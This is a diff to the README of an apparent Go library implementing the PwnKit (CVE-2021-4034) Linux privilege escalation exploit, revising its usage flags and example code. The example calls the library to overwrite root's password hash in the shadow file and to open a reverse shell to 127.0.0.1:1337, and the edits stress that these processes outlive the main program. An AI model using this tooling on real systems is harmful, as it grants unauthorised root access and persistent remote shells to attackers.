@@ -2,6 +2,8 @@
 
 A pure-Go implementation of the **CVE-2021-4034 PwnKit** exploit.
 
+The exploit use `syscall.ForkExec` to survive end of main program.
+
 
 
 ## Installation
@@ -32,7 +34,7 @@ Usage of ./exploit:
   -c string
         Command to execute as root
   -r string
-        Optionally open a reverse-shell instead. Format: ip:port
+        Open a reverse-shell instead. Format: ip:port
   -s    Spawn a root shell
 ```
 
@@ -57,14 +59,16 @@ import (
 )
 
 func main() {
-    // Command use syscall.ForkExec to run command as root in a separate process
+    // Change root password to 'password'
     gopwnkit.Command(`sed -i -e 's,^root:[^:]\+:,root:$6$eymNRCK.KxwDM6vu$idH0swGW1nsnLb8fT1QibUho5xg7uGJT7fuiheLZHIi9M4gTSk0qIOlUIk2Mm9/Nz5C.T4GkgkmLcK5BtOPkS0:,' etc/shadow`)
 
-    // RevShell use syscall.ForkExec to open TCP connection in a separate process which survives end of main program
+    // Open a reverse-shell
     gopwnkit.RevShell("127.0.0.1:1337")
 }
 
 ```
+
+Note as `Command` and `RevShell` use `syscall.ForkExec` to run the exploit, resulting processes are separate from the main program and survive its end.
 
 
 
